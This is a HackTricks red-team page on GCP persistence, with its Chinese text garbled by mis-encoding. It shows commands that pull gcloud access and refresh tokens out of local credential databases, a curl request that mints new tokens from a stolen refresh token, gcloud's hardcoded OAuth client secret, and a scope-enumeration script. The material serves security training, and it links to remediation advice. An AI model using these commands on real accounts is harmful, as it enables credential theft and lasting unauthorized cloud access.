# GCP - éæœåŠ¡æŒä¹…æ€§

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

è¿™äº›æ˜¯æœ‰ç”¨çš„æŠ€æœ¯ï¼Œä¸€æ—¦ä½ ä»¥æŸç§æ–¹å¼è·å–äº† GCP å‡­è¯æˆ–åœ¨ GCP ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ã€‚

## ä»¤ç‰ŒåŠ«æŒ

### è®¤è¯ç”¨æˆ·ä»¤ç‰Œ

è¦è·å–ç”¨æˆ·çš„ **å½“å‰ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥è¿è¡Œï¼š 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

æŸ¥çœ‹æ­¤é¡µé¢å¦‚ä½•**ç›´æ¥ä½¿ç”¨æ­¤ä»¤ç‰Œé€šè¿‡gcloud**ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

è¦è·å–**ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œ**çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

è¿˜å¯ä»¥åœ¨ **`$HOME/.config/gcloud/application_default_credentials.json`** å’Œ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** ä¸­æ‰¾åˆ°åˆ·æ–°ä»¤ç‰Œã€‚

è¦ä½¿ç”¨ **åˆ·æ–°ä»¤ç‰Œ**ã€å®¢æˆ·ç«¯ ID å’Œå®¢æˆ·ç«¯å¯†é’¥è·å–æ–°çš„åˆ·æ–°è®¿é—®ä»¤ç‰Œï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

åˆ·æ–°ä»¤ç‰Œçš„æœ‰æ•ˆæ€§å¯ä»¥åœ¨ **Admin** > **Security** > **Google Cloud session control** ä¸­ç®¡ç†ï¼Œé»˜è®¤è®¾ç½®ä¸º 16 å°æ—¶ï¼Œå°½ç®¡å¯ä»¥è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸï¼š

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

ä½¿ç”¨ç±»ä¼¼ `gcloud auth login` çš„è®¤è¯æµç¨‹å°†åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªæç¤ºï¼Œæ¥å—æ‰€æœ‰èŒƒå›´åï¼Œæµè§ˆå™¨å°†å‘å·¥å…·æ‰“å¼€çš„ http ç«¯å£å‘é€ç±»ä¼¼äºä»¥ä¸‹çš„è¯·æ±‚ï¼š
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
ç„¶åï¼Œgcloud å°†ä½¿ç”¨çŠ¶æ€å’Œä»£ç ä¸ä¸€äº›ç¡¬ç¼–ç çš„ `client_id` (`32555940559.apps.googleusercontent.com`) å’Œ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) æ¥è·å– **æœ€ç»ˆçš„åˆ·æ–°ä»¤ç‰Œæ•°æ®**ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä¸ localhost çš„é€šä¿¡æ˜¯é€šè¿‡ HTTP è¿›è¡Œçš„ï¼Œå› æ­¤å¯ä»¥æ‹¦æˆªæ•°æ®ä»¥è·å–åˆ·æ–°ä»¤ç‰Œï¼Œä½†æ­¤æ•°æ®ä»…æœ‰æ•ˆ 1 æ¬¡ï¼Œå› æ­¤è¿™æ²¡æœ‰ç”¨ï¼Œç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–åˆ·æ–°ä»¤ç‰Œæ›´å®¹æ˜“ã€‚
{% endhint %}

### OAuth èŒƒå›´

æ‚¨å¯ä»¥åœ¨ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) æ‰¾åˆ°æ‰€æœ‰ Google èŒƒå›´ï¼Œæˆ–é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è·å–å®ƒä»¬ï¼š

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æŸ¥çœ‹**`gcloud`**ç”¨äºèº«ä»½éªŒè¯çš„åº”ç”¨ç¨‹åºå¯ä»¥æ”¯æŒå“ªäº›èŒƒå›´ï¼š
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
åœ¨æ‰§è¡Œåï¼Œæ£€æŸ¥åˆ°æ­¤åº”ç”¨æ”¯æŒä»¥ä¸‹èŒƒå›´ï¼š
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
å®ƒå¾ˆæœ‰è¶£åœ°çœ‹åˆ°è¿™ä¸ªåº”ç”¨æ”¯æŒ**`drive`**èŒƒå›´ï¼Œè¿™å¯èƒ½å…è®¸ç”¨æˆ·åœ¨æ”»å‡»è€…è®¾æ³•è¿«ä½¿ç”¨æˆ·ç”Ÿæˆå…·æœ‰æ­¤èŒƒå›´çš„ä»¤ç‰Œæ—¶ï¼Œä»GCPå‡çº§åˆ°Workspaceã€‚

**æ£€æŸ¥å¦‚ä½•** [**åœ¨è¿™é‡Œæ»¥ç”¨å®ƒ**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### æœåŠ¡è´¦æˆ·

å°±åƒç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœæ‚¨è®¾æ³•**æ³„éœ²æœåŠ¡è´¦æˆ·çš„ç§é’¥æ–‡ä»¶**ï¼Œæ‚¨å°†èƒ½å¤Ÿ**é€šå¸¸æ— é™æœŸè®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœæ‚¨çªƒå–äº†æœåŠ¡è´¦æˆ·çš„**OAuthä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½ä¼šæ›´æœ‰è¶£ï¼Œå› ä¸ºå³ä½¿é»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œä»…åœ¨ä¸€ä¸ªå°æ—¶å†…æœ‰æ•ˆï¼Œå¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰APIå¯†é’¥ï¼ŒOAuthä»¤ç‰Œåœ¨è¿‡æœŸä¹‹å‰ä»ç„¶æœ‰æ•ˆ**ã€‚

### å…ƒæ•°æ®

æ˜¾ç„¶ï¼Œåªè¦æ‚¨åœ¨è¿è¡ŒGCPç¯å¢ƒçš„æœºå™¨å†…éƒ¨ï¼Œæ‚¨å°†èƒ½å¤Ÿ**é€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦æˆ·**ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤ç«¯ç‚¹è®¿é—®çš„OAuthä»¤ç‰Œé€šå¸¸å—èŒƒå›´é™åˆ¶ï¼‰ã€‚

### è¡¥æ•‘æªæ–½

ä¸€äº›é’ˆå¯¹è¿™äº›æŠ€æœ¯çš„è¡¥æ•‘æªæ–½åœ¨[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)ä¸­è¿›è¡Œäº†è¯´æ˜ã€‚

## å‚è€ƒ

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
